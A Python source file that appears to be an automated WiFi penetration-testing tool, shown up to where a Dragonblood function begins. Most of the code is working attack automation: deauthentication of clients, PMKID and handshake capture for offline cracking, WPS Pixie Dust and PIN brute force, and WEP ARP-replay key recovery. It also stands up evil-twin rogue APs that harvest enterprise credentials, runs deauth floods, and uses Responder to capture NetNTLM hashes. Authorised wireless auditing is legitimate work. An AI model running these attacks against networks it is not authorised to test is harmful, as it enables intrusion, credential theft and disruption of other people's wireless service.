#!/usr/bin/env python3
"""
wifi_audit.py — Automated WiFi VAPT orchestrator (Kali/Linux).

A guided, menu-driven suite that implements the "WiFi VAPT & Wireless Security
Audit" field guide end-to-end and adds several attacks the guide omits:

  Phase 0  Adapter + monitor mode  ...... auto-detect adapter, kill interferers,
                                          start monitor mode, set reg domain
  Phase 1  Recon & discovery ........... airodump CSV parse + wash WPS scan
  Decision engine ...................... per-SSID recommended attack paths based
                                          on encryption/auth/WPS state
  Phase 2  WPA2-Personal ............... PMKID (clientless) + 4-way handshake
  Phase 3  WPS ......................... Pixie Dust + PIN brute (reaver/bully)
  Phase 4  WPA3 / transition ........... transition-mode detection + guidance
  Phase 5  Enterprise (802.1X) ......... evil-twin cred harvest (eaphammer/wpe)
  GAP ADD  WEP ......................... ARP-replay + aircrack (guide omits WEP)
  GAP ADD  Open networks ............... captive-portal / client-isolation notes
  GAP ADD  DoS resilience .............. deauth/beacon-flood test (mdk4)
  Crack .............................. hashcat (-m 22000/5500) -> John fallback
  Report ............................. self-contained HTML (+ PDF if available)

=============================================================================
 AUTHORIZED USE ONLY. Every technique here is intrusive. Run only against
 networks in your signed scope / Rules of Engagement. Deauth, rogue-AP and
 WPS brute force can disrupt live production services.
=============================================================================

Usage:
    sudo python3 wifi_audit.py                 # full interactive run
    sudo python3 wifi_audit.py -i wlan1        # pre-select adapter
    sudo python3 wifi_audit.py --recon-time 45 # longer recon sweep
    sudo python3 wifi_audit.py --report-only findings.json  # rebuild report
"""
from __future__ import annotations

import argparse
import csv
import glob
import json
import os
import re
import shutil
import signal
import subprocess
import sys
import time
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from html import escape
from pathlib import Path


# ---------------------------------------------------------------------------
# Console helpers
# ---------------------------------------------------------------------------
class C:
    R = "\033[31m"; G = "\033[32m"; Y = "\033[33m"; B = "\033[36m"
    M = "\033[35m"; W = "\033[37m"; BOLD = "\033[1m"; X = "\033[0m"

def info(m): print(f"[{C.B}*{C.X}] {m}")
def ok(m):   print(f"[{C.G}+{C.X}] {m}")
def warn(m): print(f"[{C.Y}!{C.X}] {m}")
def err(m):  print(f"[{C.R}x{C.X}] {m}", file=sys.stderr)
def hr():    print(C.W + "-" * 78 + C.X)


# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------
@dataclass
class AP:
    bssid: str = ""
    channel: str = ""
    power: str = ""
    privacy: str = ""     # WPA2, WPA3, WEP, OPN...
    cipher: str = ""      # CCMP, TKIP...
    auth: str = ""        # PSK, MGT, SAE...
    essid: str = ""
    wps: bool = False
    wps_locked: bool = False
    clients: list[str] = field(default_factory=list)

    @property
    def enc_kind(self) -> str:
        p = (self.privacy + " " + self.auth).upper()
        if "WEP" in p:
            return "WEP"
        if "OPN" in p or self.privacy.strip() in ("", "OPN"):
            return "OPEN"
        if "MGT" in p or "802.1X" in p or "EAP" in p:
            return "ENTERPRISE"
        if "WPA3" in p and "WPA2" in p:
            return "WPA23_TRANSITION"
        if "WPA3" in p or "SAE" in p:
            return "WPA3"
        if "WPA" in p:
            return "WPA2_PSK"
        return "UNKNOWN"


@dataclass
class Finding:
    ssid: str
    bssid: str
    channel: str
    band: str
    encryption: str
    title: str
    severity: str          # Critical/High/Medium/Low/Info
    status: str            # e.g. "Vulnerable", "Not vulnerable", "Tested", "Recon"
    detail: str
    evidence: list[str] = field(default_factory=list)
    recommendation: str = ""
    secret: str = ""       # cracked value (redacted in report)


# ---------------------------------------------------------------------------
# Command execution
# ---------------------------------------------------------------------------
def sh(cmd: list[str] | str, timeout: int | None = None, capture: bool = True) -> tuple[int, str]:
    """Run a command; return (rc, combined_output). Output is always str —
    TimeoutExpired can carry bytes even with text=True, so we coerce."""
    def _s(v):
        if v is None:
            return ""
        return v.decode("utf-8", "replace") if isinstance(v, bytes) else v
    shell = isinstance(cmd, str)
    try:
        p = subprocess.run(cmd, shell=shell, capture_output=capture, text=True,
                           timeout=timeout)
        out = (_s(p.stdout) + _s(p.stderr)) if capture else ""
        return p.returncode, out
    except subprocess.TimeoutExpired as e:
        return 124, (_s(e.stdout) + _s(e.stderr)) if capture else ""
    except FileNotFoundError:
        return 127, ""

def sh_live(cmd: list[str] | str, timeout: int | None = None) -> int:
    """Run a command streaming to the terminal; Ctrl-C aborts just this step."""
    shell = isinstance(cmd, str)
    try:
        p = subprocess.Popen(cmd, shell=shell)
        try:
            p.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            p.terminate()
            try: p.wait(5)
            except subprocess.TimeoutExpired: p.kill()
        return p.returncode or 0
    except KeyboardInterrupt:
        try: p.terminate()
        except Exception: pass
        warn("Step interrupted — returning to menu.")
        return 130
    except FileNotFoundError:
        return 127

def have(tool: str) -> bool:
    return shutil.which(tool) is not None

def ask(prompt: str, default: str = "") -> str:
    try:
        r = input(f"{C.M}?{C.X} {prompt} ").strip()
    except (EOFError, KeyboardInterrupt):
        return default
    return r or default

def confirm(prompt: str) -> bool:
    return ask(f"{prompt} [y/N]").lower().startswith("y")


# ---------------------------------------------------------------------------
# Tool inventory + gap analysis
# ---------------------------------------------------------------------------
TOOLS = {
    "airmon-ng": "monitor mode", "airodump-ng": "recon/capture",
    "aireplay-ng": "deauth", "aircrack-ng": "handshake validate / WEP",
    "hcxdumptool": "PMKID capture", "hcxpcapngtool": "hash conversion",
    "hashcat": "GPU cracking", "john": "CPU cracking fallback",
    "wash": "WPS discovery", "reaver": "WPS Pixie/PIN", "bully": "WPS PIN alt",
    "eaphammer": "Enterprise evil-twin", "hostapd-wpe": "Enterprise evil-twin",
    "asleap": "MSCHAPv2 crack", "mdk4": "DoS resilience test",
    "iw": "interface control", "tshark": "capture inspection",
}

def inventory() -> dict[str, bool]:
    return {t: have(t) for t in TOOLS}


# ---------------------------------------------------------------------------
# Phase 0 — adapter + monitor mode
# ---------------------------------------------------------------------------
def list_wifi_ifaces() -> list[str]:
    rc, out = sh(["iw", "dev"])
    return re.findall(r"Interface\s+(\S+)", out)

def is_monitor(iface: str) -> bool:
    rc, out = sh(["iw", "dev", iface, "info"])
    return "type monitor" in out.lower()

def start_monitor(iface: str, reg: str = "") -> str | None:
    """Put iface in monitor mode; return the monitor iface name or None."""
    if is_monitor(iface):
        ok(f"{iface} already in monitor mode.")
        return iface
    info("Stopping interfering services (airmon-ng check kill)...")
    sh(["airmon-ng", "check", "kill"])
    info(f"Enabling monitor mode on {iface}...")
    sh(["airmon-ng", "start", iface])
    if reg:
        sh(["iw", "reg", "set", reg]); ok(f"Regulatory domain set to {reg}.")
    # figure out the resulting monitor iface
    for cand in (f"{iface}mon", iface):
        if cand in list_wifi_ifaces() and is_monitor(cand):
            ok(f"Monitor mode active: {cand}")
            return cand
    # fall back: any monitor iface now present
    for i in list_wifi_ifaces():
        if is_monitor(i):
            ok(f"Monitor mode active: {i}")
            return i
    err("Could not enable monitor mode. Injection-capable adapter required "
        "(the built-in Intel AX211 cannot do this).")
    return None

def stop_monitor(mon: str):
    info("Restoring managed mode / NetworkManager...")
    sh(["airmon-ng", "stop", mon])
    sh(["systemctl", "start", "NetworkManager"])
    ok("Interface restored.")

def injection_test(mon: str):
    rc, out = sh(["aireplay-ng", "--test", mon], timeout=25)
    if "injection is working" in out.lower():
        ok("Injection test passed.")
    else:
        warn("Injection not confirmed — active attacks (deauth/WPS) may fail. "
             "Passive capture still works.")


# ---------------------------------------------------------------------------
# Phase 1 — recon
# ---------------------------------------------------------------------------
def recon(mon: str, seconds: int, workdir: Path) -> list[AP]:
    prefix = str(workdir / "recon")
    for f in glob.glob(prefix + "*"):
        try: os.remove(f)
        except OSError: pass
    info(f"Sweeping 2.4 + 5 GHz for {seconds}s (airodump-ng)...")
    p = subprocess.Popen(
        ["airodump-ng", "--band", "abg", "-w", prefix,
         "--output-format", "csv", mon],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        time.sleep(seconds)
    except KeyboardInterrupt:
        pass
    p.terminate()
    try: p.wait(5)
    except subprocess.TimeoutExpired: p.kill()

    csvs = sorted(glob.glob(prefix + "*.csv"))
    if not csvs:
        err("No recon CSV produced — is the adapter in monitor mode?")
        return []
    aps = parse_airodump_csv(csvs[-1])
    ok(f"Recon complete: {len(aps)} access points seen.")
    wps_scan(mon, aps, seconds=min(20, seconds))
    return aps

def filter_targets(aps: list[AP], bssid: str, ssid: str) -> list[AP]:
    """Scope the AP list to a specific BSSID and/or SSID (case-insensitive)."""
    b = bssid.strip().upper()
    s = ssid.strip().lower()
    out = []
    for a in aps:
        if b and a.bssid.upper() != b:
            continue
        if s and a.essid.lower() != s:
            continue
        out.append(a)
    return out

def parse_airodump_csv(path: str) -> list[AP]:
    aps: dict[str, AP] = {}
    with open(path, encoding="utf-8", errors="replace") as f:
        text = f.read()
    # two sections separated by a line beginning with "Station MAC"
    parts = re.split(r"\r?\n\s*\r?\n", text)
    ap_block = parts[0] if parts else ""
    st_block = ""
    for blk in parts[1:]:
        if "Station MAC" in blk:
            st_block = blk; break

    for row in csv.reader(ap_block.splitlines()):
        if not row or row[0].strip() == "BSSID" or len(row) < 14:
            continue
        bssid = row[0].strip()
        if not re.match(r"([0-9A-Fa-f]{2}:){5}", bssid):
            continue
        aps[bssid] = AP(
            bssid=bssid, channel=row[3].strip(), privacy=row[5].strip(),
            cipher=row[6].strip(), auth=row[7].strip(), power=row[8].strip(),
            essid=row[13].strip() or "<hidden>")
    # stations -> attach clients
    if st_block:
        for row in csv.reader(st_block.splitlines()):
            if not row or row[0].strip() == "Station MAC" or len(row) < 6:
                continue
            client = row[0].strip(); ap_bssid = row[5].strip()
            if ap_bssid in aps and re.match(r"([0-9A-Fa-f]{2}:){5}", client):
                aps[ap_bssid].clients.append(client)
    return list(aps.values())

def wps_scan(mon: str, aps: list[AP], seconds: int = 15):
    if not have("wash"):
        warn("wash not installed — skipping WPS discovery.")
        return
    info(f"Scanning for WPS-enabled APs (wash, {seconds}s)...")
    rc, out = sh(["timeout", str(seconds), "wash", "-i", mon])
    idx = {a.bssid.upper(): a for a in aps}
    for line in out.splitlines():
        m = re.match(r"\s*([0-9A-Fa-f:]{17})\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)", line)
        if not m:
            continue
        bssid = m.group(1).upper()
        locked = m.group(5).lower() in ("yes", "locked")
        if bssid in idx:
            idx[bssid].wps = True
            idx[bssid].wps_locked = locked
    n = sum(1 for a in aps if a.wps)
    ok(f"WPS scan done: {n} AP(s) advertise WPS.")


# ---------------------------------------------------------------------------
# Decision engine — recommend attack paths per AP
# ---------------------------------------------------------------------------
# registry: key -> (label, applies_to, tools, disruptive, from_pdf, opt_in)
_ALL_KINDS = {"WPA2_PSK", "WPA3", "WPA23_TRANSITION", "ENTERPRISE", "OPEN", "WEP"}
ATTACKS = {
    "pmkid":       ("PMKID capture (clientless)", {"WPA2_PSK", "WPA23_TRANSITION"},
                    ["hcxdumptool", "hcxpcapngtool"], False, True, False),
    "handshake":   ("4-way handshake + targeted deauth", {"WPA2_PSK", "WPA23_TRANSITION"},
                    ["airodump-ng", "aireplay-ng"], True, True, False),
    "wps_pixie":   ("WPS Pixie Dust", {"WPA2_PSK", "WPA23_TRANSITION"},
                    ["reaver"], True, True, False),
    "wps_brute":   ("WPS PIN brute force", {"WPA2_PSK", "WPA23_TRANSITION"},
                    ["reaver"], True, True, False),
    "wpa3_trans":  ("WPA3 transition-mode downgrade check", {"WPA3", "WPA23_TRANSITION"},
                    ["hcxdumptool"], False, True, False),
    "enterprise":  ("Enterprise evil-twin cred harvest", {"ENTERPRISE"},
                    ["eaphammer"], True, True, False),
    "wep":         ("WEP ARP-replay + aircrack (GAP: not in guide)", {"WEP"},
                    ["airodump-ng", "aireplay-ng", "aircrack-ng"], True, False, False),
    "open":        ("Open-network exposure / client-isolation (GAP)", {"OPEN"},
                    ["nmap"], False, False, False),
    "dos":         ("Deauth/beacon-flood resilience (GAP)", _ALL_KINDS,
                    ["mdk4"], True, False, False),
    # ---- opt-in modules: separate authorization, never auto-run ----
    "post_assoc":  ("Post-association segmentation + Responder (OPT-IN)", _ALL_KINDS,
                    ["nmap"], True, True, True),
    "dragonblood": ("WPA3 Dragonblood SAE PoCs (OPT-IN)", {"WPA3", "WPA23_TRANSITION"},
                    [], True, True, True),
    "captive":     ("Captive-portal evil-twin PSK phishing (OPT-IN, GAP)",
                    {"WPA2_PSK", "WPA23_TRANSITION", "OPEN"},
                    ["wifiphisher"], True, False, True),
}

def recommend(ap: AP) -> list[tuple[str, str]]:
    """Return ordered [(attack_key, rationale)] for an AP."""
    k = ap.enc_kind
    recs: list[tuple[str, str]] = []
    if k == "WEP":
        recs.append(("wep", "WEP is trivially broken — ARP-replay + aircrack recovers the key in minutes."))
    elif k == "OPEN":
        recs.append(("open", "No encryption — test client isolation, captive-portal bypass, data exposure."))
    elif k == "ENTERPRISE":
        recs.append(("enterprise", "802.1X/MGT — evil-twin to catch supplicants that don't validate the RADIUS cert."))
    elif k in ("WPA2_PSK", "WPA23_TRANSITION"):
        recs.append(("pmkid", "Try first — clientless, no deauth, least disruptive."))
        recs.append(("handshake", f"Fallback if no PMKID; {len(ap.clients)} client(s) seen to deauth."))
        if ap.wps and not ap.wps_locked:
            recs.append(("wps_pixie", "WPS unlocked — Pixie Dust can recover the PIN (and full PSK) in minutes."))
            recs.append(("wps_brute", "If Pixie fails, brute the ~11,000-space PIN (watch for lockout)."))
        elif ap.wps and ap.wps_locked:
            recs.append(("wps_pixie", "WPS present but LOCKED — likely rate-limited; note as a lower-priority finding."))
        if k == "WPA23_TRANSITION":
            recs.append(("wpa3_trans", "Transition mode: a client can be forced to WPA2 — capture & crack that."))
    elif k == "WPA3":
        recs.append(("wpa3_trans", "Pure WPA3-SAE resists offline cracking — check transition mode / Dragonblood, document config."))
    # ---- opt-in modules (appended last; each gated + separate authorization) ----
    if k in ("WPA2_PSK", "WPA23_TRANSITION", "OPEN"):
        recs.append(("captive", "If cracking fails: captive-portal evil-twin to phish the PSK from users "
                     "(social engineering — explicit RoE)."))
    if k in ("WPA3", "WPA23_TRANSITION"):
        recs.append(("dragonblood", "Research-grade: test SAE for Dragonblood timing/DoS side-channels "
                     "(separate authorization)."))
    recs.append(("post_assoc", "After access (open net or cracked key): test VLAN segmentation / client "
                 "isolation / Responder (separate authorization)."))
    recs.append(("dos", "Optional: test AP resilience to deauth/beacon flood (disruptive — RoE gate)."))
    return recs


# ---------------------------------------------------------------------------
# Attack implementations
# ---------------------------------------------------------------------------
def band_of(channel: str) -> str:
    try:
        c = int(channel)
    except ValueError:
        return "?"
    return "2.4 GHz" if c <= 14 else ("6 GHz" if c >= 233 else "5 GHz")

def hcxdumptool_ver() -> tuple[int, int]:
    """Return (major, minor) of the installed hcxdumptool, e.g. (6, 3)."""
    rc, out = sh(["hcxdumptool", "--version"])
    m = re.search(r"(\d+)\.(\d+)", out)
    return (int(m.group(1)), int(m.group(2))) if m else (6, 3)

def _prep_monitor_channel(mon: str, ch: str) -> None:
    """Re-assert monitor mode + channel via iw BEFORE calling hcxdumptool 6.3.x.

    The 6.3.x rewrite tries to 'arm' the interface itself and Realtek out-of-tree
    drivers (Alfa 8812AU/8814AU) reject that step with the misleading error
    'failed to arm interface -driver does not support monitor mode'. Setting
    monitor mode ourselves first means the driver is already where hcxdumptool
    needs it, so it doesn't have to (and fail to) do the arming.
    """
    sh(["ip", "link", "set", mon, "down"])
    sh(["iw", "dev", mon, "set", "monitor", "none"])
    sh(["ip", "link", "set", mon, "up"])
    sh(["iw", "dev", mon, "set", "channel", str(ch)])

def attack_pmkid(ap: AP, mon: str, wd: Path) -> Finding | None:
    if not (have("hcxdumptool") and have("hcxpcapngtool")):
        warn("hcxdumptool/hcxtools missing — skipping PMKID."); return None
    out_pcap = wd / f"pmkid_{ap.bssid.replace(':','')}.pcapng"
    ch = ap.channel or "1"
    info(f"PMKID capture on {ap.essid} (ch {ch}) ~30s...")
    major, minor = hcxdumptool_ver()
    if (major, minor) >= (6, 3):
        # 6.3.x rewrite: it won't set monitor mode and its self-arm step breaks
        # on Realtek drivers. Put the iface in monitor mode ourselves first.
        _prep_monitor_channel(mon, ch)
        sh_live(["timeout", "30", "hcxdumptool", "-i", mon,
                 "-w", str(out_pcap), "-c", f"{ch}a"], timeout=35)
    else:
        # 6.2.x and earlier: self-manages the interface, old status flag.
        sh_live(["timeout", "30", "hcxdumptool", "-i", mon,
                 "-w", str(out_pcap), "--enable_status=1",
                 "-c", str(ch)], timeout=35)
    if not out_pcap.exists() or out_pcap.stat().st_size == 0:
        return Finding(ap.essid, ap.bssid, ap.channel, band_of(ap.channel),
                       ap.enc_kind, "PMKID capture", "Info", "No PMKID",
                       "AP did not leak a PMKID during the capture window.",
                       recommendation="Fall back to 4-way handshake capture.")
    h = wd / f"pmkid_{ap.bssid.replace(':','')}.hc22000"
    sh(["hcxpcapngtool", "-o", str(h), str(out_pcap)])
    if h.exists() and h.stat().st_size > 0:
        ok(f"PMKID hash extracted: {h}")
        return Finding(ap.essid, ap.bssid, ap.channel, band_of(ap.channel),
                       ap.enc_kind, "PMKID exposed (offline-crackable)", "High",
                       "Vulnerable", "AP leaked a PMKID in the association frame; "
                       "the PSK is recoverable offline if weak.",
                       evidence=[str(out_pcap), str(h)],
                       recommendation="Enforce a long random passphrase; disable "
                       "PMKID caching where possible; migrate to WPA3-SAE.")
    return Finding(ap.essid, ap.bssid, ap.channel, band_of(ap.channel),
                   ap.enc_kind, "PMKID capture", "Info", "No hash",
                   "Captured frames contained no usable PMKID.")

def attack_handshake(ap: AP, mon: str, wd: Path) -> Finding | None:
    if not (have("airodump-ng") and have("aireplay-ng")):
        warn("airodump/aireplay missing — skipping handshake."); return None
    ch = ap.channel or "1"
    prefix = str(wd / f"hs_{ap.bssid.replace(':','')}")
    for f in glob.glob(prefix + "*"):
        try: os.remove(f)
        except OSError: pass
    info(f"Capturing 4-way handshake on {ap.essid} (ch {ch})...")
    dump = subprocess.Popen(
        ["airodump-ng", "-c", ch, "--bssid", ap.bssid, "-w", prefix,
         "--output-format", "pcap,csv", mon],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(4)
    targets = ap.clients[:3] or [None]
    deadline = time.time() + 120
    got = False; cap = prefix + "-01.cap"
    try:
        while time.time() < deadline:
            for cl in targets:
                if cl:
                    info(f"Targeted deauth of client {cl} (x3)...")
                    sh(["aireplay-ng", "--deauth", "3", "-a", ap.bssid, "-c", cl, mon])
                else:
                    warn("No known client — sending small broadcast deauth (more disruptive).")
                    sh(["aireplay-ng", "--deauth", "2", "-a", ap.bssid, mon])
            time.sleep(8)
            rc, out = sh(["aircrack-ng", cap]) if os.path.exists(cap) else (1, "")
            if re.search(r"1 handshake|WPA \(1 handshake", out, re.I):
                got = True; break
            info("No handshake yet, retrying...")
    finally:
        dump.terminate()
        try: dump.wait(5)
        except subprocess.TimeoutExpired: dump.kill()
    if not got:
        return Finding(ap.essid, ap.bssid, ap.channel, band_of(ap.channel),
                       ap.enc_kind, "4-way handshake", "Info", "Not captured",
                       "No handshake within the window (no active client / injection issue).")
    h = wd / f"hs_{ap.bssid.replace(':','')}.hc22000"
    if have("hcxpcapngtool"):
        sh(["hcxpcapngtool", "-o", str(h), cap])
    ok(f"Handshake captured: {cap}")
    return Finding(ap.essid, ap.bssid, ap.channel, band_of(ap.channel),
                   ap.enc_kind, "WPA2 4-way handshake captured", "High", "Vulnerable",
                   "Full 4-way handshake captured; PSK is offline-crackable if weak.",
                   evidence=[cap] + ([str(h)] if h.exists() else []),
                   recommendation="Enforce a strong random passphrase and rotate it; "
                   "consider WPA3-SAE which resists offline attack.")

def attack_wps(ap: AP, mon: str, wd: Path, mode: str) -> Finding | None:
    if not have("reaver"):
        warn("reaver missing — skipping WPS."); return None
    ch = ap.channel or "6"
    log = wd / f"wps_{ap.bssid.replace(':','')}.log"
    if mode == "pixie":
        info(f"WPS Pixie Dust on {ap.essid}... (Ctrl-C to stop)")
        cmd = ["reaver", "-i", mon, "-b", ap.bssid, "-c", ch, "-K", "-vv"]
    else:
        warn("WPS PIN brute can take hours and may lock the AP.")
        if not confirm("Proceed with PIN brute force?"):
            return None
        cmd = ["reaver", "-i", mon, "-b", ap.bssid, "-c", ch, "-vv", "-d", "15", "-T", "2"]
    with open(log, "w") as lf:
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        pin = psk = ""
        try:
            for line in p.stdout:
                print(line, end=""); lf.write(line)
                if "WPS PIN:" in line:
                    pin = line.split("WPS PIN:")[1].strip().strip("'\"")
                if "WPA PSK:" in line or "PSK:" in line:
                    psk = line.split("PSK:")[1].strip().strip("'\"")
                if pin and psk:
                    p.terminate(); break
        except KeyboardInterrupt:
            p.terminate(); warn("WPS attack interrupted.")
    if pin or psk:
        return Finding(ap.essid, ap.bssid, ap.channel, band_of(ap.channel),
                       ap.enc_kind, f"WPS {mode} recovered PIN/PSK", "Critical", "Vulnerable",
                       f"WPS {'Pixie Dust' if mode=='pixie' else 'PIN brute'} recovered the "
                       f"WPS PIN{' and WPA PSK' if psk else ''} — full network access regardless "
                       "of passphrase strength.",
                       evidence=[str(log)], secret=(psk or pin),
                       recommendation="Disable WPS entirely on all APs.")
    return Finding(ap.essid, ap.bssid, ap.channel, band_of(ap.channel),
                   ap.enc_kind, f"WPS {mode}", "Info", "Not vulnerable",
                   "WPS attack did not recover a PIN (locked/rate-limited or patched).",
                   evidence=[str(log)])

def attack_wep(ap: AP, mon: str, wd: Path) -> Finding | None:
    if not (have("airodump-ng") and have("aircrack-ng")):
        warn("aircrack-ng suite missing — skipping WEP."); return None
    ch = ap.channel or "1"
    prefix = str(wd / f"wep_{ap.bssid.replace(':','')}")
    info(f"WEP IV capture on {ap.essid} (ch {ch}) — targeting ~20k+ IVs...")
    dump = subprocess.Popen(
        ["airodump-ng", "-c", ch, "--bssid", ap.bssid, "-w", prefix,
         "--output-format", "pcap,csv", mon],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    if have("aireplay-ng"):
        sh(["aireplay-ng", "-1", "0", "-a", ap.bssid, mon])           # fake auth
        subprocess.Popen(["aireplay-ng", "-3", "-b", ap.bssid, mon],  # ARP replay
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    key = ""
    try:
        deadline = time.time() + 180
        while time.time() < deadline:
            time.sleep(15)
            cap = prefix + "-01.cap"
            if os.path.exists(cap):
                rc, out = sh(["aircrack-ng", "-b", ap.bssid, cap], timeout=30)
                m = re.search(r"KEY FOUND!\s*\[\s*([0-9A-Fa-f:]+)\s*\]", out)
                if m:
                    key = m.group(1); break
                info("Not enough IVs yet, continuing capture...")
    except KeyboardInterrupt:
        pass
    finally:
        dump.terminate()
        try: dump.wait(5)
        except subprocess.TimeoutExpired: dump.kill()
        sh("pkill -f 'aireplay-ng -3'")
    if key:
        return Finding(ap.essid, ap.bssid, ap.channel, band_of(ap.channel),
                       "WEP", "WEP key recovered", "Critical", "Vulnerable",
                       "WEP key recovered via ARP-replay + statistical attack.",
                       secret=key, recommendation="WEP is obsolete — migrate to WPA2/WPA3 immediately.")
    return Finding(ap.essid, ap.bssid, ap.channel, band_of(ap.channel),
                   "WEP", "WEP cracking", "High", "Tested",
                   "Insufficient IVs captured to recover the key in the window, but WEP itself "
                   "is fundamentally broken.",
                   recommendation="WEP is obsolete — migrate to WPA2/WPA3 immediately.")

def attack_wpa3_trans(ap: AP, mon: str, wd: Path) -> Finding | None:
    kind = ap.enc_kind
    if kind == "WPA23_TRANSITION":
        return Finding(ap.essid, ap.bssid, ap.channel, band_of(ap.channel), kind,
                       "WPA3 transition mode enabled (downgrade risk)", "Medium", "Vulnerable",
                       "The SSID advertises both WPA3-SAE and WPA2-PSK. A client can be forced "
                       "onto WPA2 and its handshake/PMKID captured and cracked offline.",
                       recommendation="Disable transition mode; run WPA3-only where clients allow.")
    return Finding(ap.essid, ap.bssid, ap.channel, band_of(ap.channel), kind,
                   "WPA3-SAE configuration", "Info", "Not vulnerable (offline)",
                   "Pure WPA3-SAE resists offline cracking. Review firmware for Dragonblood-class "
                   "SAE downgrade/side-channel issues and enforce a strong passphrase policy.",
                   recommendation="Keep firmware patched; verify no transition fallback is enabled.")

def attack_enterprise(ap: AP, mon: str, wd: Path) -> Finding | None:
    tool = "eaphammer" if have("eaphammer") else ("hostapd-wpe" if have("hostapd-wpe") else None)
    if not tool:
        warn("eaphammer/hostapd-wpe missing — skipping Enterprise."); return None
    warn("Evil-twin stands up a ROGUE AP impersonating the corporate SSID.")
    warn("This is highly intrusive — confirm it is explicitly in your RoE.")
    if not confirm("Launch the rogue AP now?"):
        return Finding(ap.essid, ap.bssid, ap.channel, band_of(ap.channel), "ENTERPRISE",
                       "Enterprise evil-twin (skipped)", "Info", "Not tested",
                       "Operator declined the rogue-AP test at runtime.")
    info(f"Launching {tool} rogue AP for SSID '{ap.essid}' (ch {ap.channel}) — Ctrl-C to stop.")
    if tool == "eaphammer":
        sh_live(["eaphammer", "-i", mon, "--channel", ap.channel or "6",
                 "--auth", "wpa-eap", "--essid", ap.essid, "--creds"])
    else:
        sh_live(["hostapd-wpe", "/etc/hostapd-wpe/hostapd-wpe.conf"])
    return Finding(ap.essid, ap.bssid, ap.channel, band_of(ap.channel), "ENTERPRISE",
                   "Enterprise supplicant cert-validation test", "High", "Tested",
                   "Rogue AP presented; any captured MSCHAPv2 challenge/response indicates a "
                   "client that does not validate the RADIUS server certificate. Crack captured "
                   "hashes with asleap / hashcat -m 5500.",
                   recommendation="Enforce server-certificate validation + CA pinning via device policy.")

def attack_open(ap: AP, mon: str, wd: Path) -> Finding:
    return Finding(ap.essid, ap.bssid, ap.channel, band_of(ap.channel), "OPEN",
                   "Open network (no encryption)", "High", "Vulnerable",
                   "SSID uses no encryption — all client traffic is in the clear and subject to "
                   "sniffing. Once associated, test client isolation and reachability into "
                   "production/management VLANs (nmap) as a separate, RoE-gated step.",
                   recommendation="Require WPA2/WPA3; if a guest network is intended, enforce "
                   "client isolation and full segmentation from corporate/management VLANs.")

def attack_dos(ap: AP, mon: str, wd: Path) -> Finding | None:
    if not have("mdk4"):
        warn("mdk4 missing — skipping DoS resilience test."); return None
    warn("DoS test actively disrupts the AP. Confirm RoE + a short, controlled window.")
    if not confirm("Run a 15s deauth-flood resilience test?"):
        return None
    info("Running mdk4 deauth flood for 15s...")
    sh_live(["timeout", "15", "mdk4", mon, "d", "-B", ap.bssid])
    return Finding(ap.essid, ap.bssid, ap.channel, band_of(ap.channel), ap.enc_kind,
                   "Deauth-flood resilience", "Medium", "Tested",
                   "AP/clients were subjected to a controlled deauth flood to gauge resilience "
                   "and management-frame protection (802.11w/PMF).",
                   recommendation="Enable 802.11w (Protected Management Frames) to blunt deauth attacks.")

# ---- OPT-IN module: post-association segmentation + Responder --------------
def attack_post_assoc(ap: AP, mon: str, wd: Path) -> Finding | None:
    warn("POST-ASSOCIATION testing runs AFTER you are connected to the network")
    warn("(open SSID, or via a cracked key). Active scanning of production ranges and")
    warn("Responder are USUALLY A SEPARATE AUTHORIZATION from the wireless test.")
    if not confirm("Proceed with post-association network testing?"):
        return Finding(ap.essid, ap.bssid, ap.channel, band_of(ap.channel), ap.enc_kind,
                       "Post-association testing (skipped)", "Info", "Not tested",
                       "Operator declined the post-association module at runtime.")
    if not have("nmap"):
        warn("nmap missing — install: sudo apt install nmap"); return None
    warn("This machine must ALREADY be associated to the target network in MANAGED mode")
    warn("(e.g. the built-in card connected via NetworkManager, while the USB adapter stays")
    warn("in monitor mode for the rest of the audit).")
    conn_if = ask("Connected (managed) interface to test from [e.g. wlan0 / eth0], blank=auto:", "")
    cidr = ask("Target CIDR for segmentation test [e.g. 10.0.0.0/24]:", "")
    if not cidr:
        warn("No target range supplied — aborting module."); return None
    ifarg = ["-e", conn_if] if conn_if else []
    log = wd / f"postassoc_{ap.bssid.replace(':','')}.txt"
    info(f"Host discovery: nmap -sn {cidr} ...")
    rc, out = sh(["nmap", "-sn", *ifarg, cidr], timeout=300)
    log.write_text(out, encoding="utf-8")
    live = re.findall(r"Nmap scan report for (\S+)", out)
    ok(f"{len(live)} host(s) reachable from the wireless segment.")
    if live and confirm("Run a service scan on a discovered host?"):
        tgt = ask("Target IP:", live[0])
        if tgt:
            info(f"Service scan: nmap -Pn -sV --top-ports 200 {tgt} ...")
            rc, out2 = sh(["nmap", "-Pn", "-sV", "--top-ports", "200", *ifarg, tgt], timeout=600)
            with open(log, "a", encoding="utf-8") as lf:
                lf.write("\n\n=== service scan ===\n" + out2)
    responder_note = ""
    if have("responder") and confirm("Run Responder (LLMNR/NBT-NS) for 60s — ONLY if explicitly in scope?"):
        ri = conn_if or ask("Interface for Responder:", "wlan0")
        warn("Launching Responder (60s). Captured hashes land in /usr/share/responder/logs.")
        sh_live(["timeout", "60", "responder", "-I", ri], timeout=70)
        responder_note = " Responder was run — inspect its logs for captured NetNTLM hashes."
    sev = "High" if live else "Info"
    status = "Vulnerable — reachable" if live else "Isolated / not reachable"
    detail = (f"From the wireless segment, {len(live)} host(s) were reachable on {cidr}. "
              "Wireless clients — especially guest — should be isolated from production and "
              "management VLANs (iDRAC/iLO, switch management, hypervisors)." + responder_note)
    return Finding(ap.essid, ap.bssid, ap.channel, band_of(ap.channel), ap.enc_kind,
                   "Post-association segmentation exposure", sev, status, detail,
                   evidence=[str(log)],
                   recommendation="Enforce wireless→wired segmentation and client isolation; "
                   "restrict guest VLANs to internet-only; disable LLMNR/NBT-NS to blunt Responder.")

# ---- OPT-IN module: WPA3 Dragonblood SAE PoCs ------------------------------
def attack_dragonblood(ap: AP, mon: str, wd: Path) -> Finding | None:
